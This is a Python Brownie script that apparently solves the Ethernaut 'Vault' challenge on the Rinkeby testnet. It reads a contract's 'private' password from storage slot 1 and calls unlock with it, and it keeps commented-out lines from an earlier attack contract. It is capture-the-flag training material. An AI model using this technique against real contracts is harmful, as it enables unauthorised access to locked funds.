from multiprocessing.connection import wait
from brownie import *
from brownie.network.state import Chain
from web3 import Web3, eth

import time
import json
import os

# get the default priority fee and multiply by 5 to ensure the tx is executed rapidly
priority_fee=chain.priority_fee*5

# attacker=accounts[0]
acct_pwd=os.getenv("ACCT_PWD")
attacker=accounts.load('ethernaut_rinkeby', acct_pwd)

target_address='0xcA0C61619943c20754B3102bEFeA506A52775F06'
target_ct=interface.Vault(target_address)

# deploy attacker contract
# attacker_contract=forceAttack.deploy(target_address, {'from': attacker, 'priority_fee': priority_fee})

def main():

    # print('attacker_contract:', attacker_contract)
    # send some ETH to the attacker contract
    # attacker.transfer(attacker_contract.address, amount=1, priority_fee=priority_fee)
    # print('attacker_contract balance: ', attacker_contract.balance())
    # tx=attacker_contract.attack({'from': attacker, 'priority_fee': priority_fee, 'gas_limit': 1000000})
    # print('target_ct balance: ', target_ct.balance())

    print('target_address:', target_ct.address)

    # get the content of the second slot ot memory (bytes32 variable will occuppy the whole slot)
    pwd=web3.eth.get_storage_at(target_address,'0x01')
    print('pwd: ', pwd)

    tx=target_ct.unlock(pwd, {'from': attacker, 'priority_fee': priority_fee})

    print('locked: ', target_ct.locked())
    
